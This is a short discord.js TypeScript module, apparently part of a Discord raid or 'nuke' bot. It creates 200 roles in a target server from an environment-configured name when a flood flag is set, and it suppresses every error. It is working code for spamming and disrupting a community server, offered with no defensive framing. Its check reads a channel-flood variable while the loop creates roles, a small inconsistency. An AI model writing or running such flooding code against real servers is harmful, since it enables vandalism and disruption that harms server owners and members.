import { Guild } from "discord.js";

export default async (guild: Guild): Promise<void> => {
	if (process.env.CHANNELS_FLOOD) {
		for (let i = 0; i < 200; i++) {
			await guild.roles
				.create({
					name: process.env.ROLES_FLOOD_NAME,
				})
				.catch(() => {});
		}
	}
};
